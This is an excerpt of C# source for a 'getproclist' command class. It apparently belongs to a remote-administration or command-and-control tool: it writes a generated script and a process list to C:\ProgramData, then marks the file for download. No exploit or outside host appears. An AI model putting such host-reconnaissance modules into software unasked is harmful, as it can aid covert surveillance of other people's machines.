...
{
    public class GetProcList : Command
    {
        public static string path = @"C:\ProgramData\";

        public GetProcList(string name): base(name) { }

        public override string execute(string[] args)
        {
            if(args.Length == 1)
            {
                if (File.Exists(path + "proclist.txt"))
                {
                    File.Delete(path + "proclist.txt");
                }
                ...
                {
                    Byte[] line1 = new UTF8Encoding(true).GetBytes(@"$file = " + (char)34 + @"C:\ProgramData\proclist.txt" + (char)34);
            ...
            else
            {
                ...
                Console.WriteLine("Invalid arguments for 'getproclist'.Requires 1 argument(s).");
        ...
        {
            string filetoDownload = "proclist.txt";
        ...
        public static void check()
        {
            ...
            else
            {
                ...
                Console.ForegroundColor = ConsoleColor.White;
                string[] proclist = File.ReadAllLines(path + "proclist.txt");
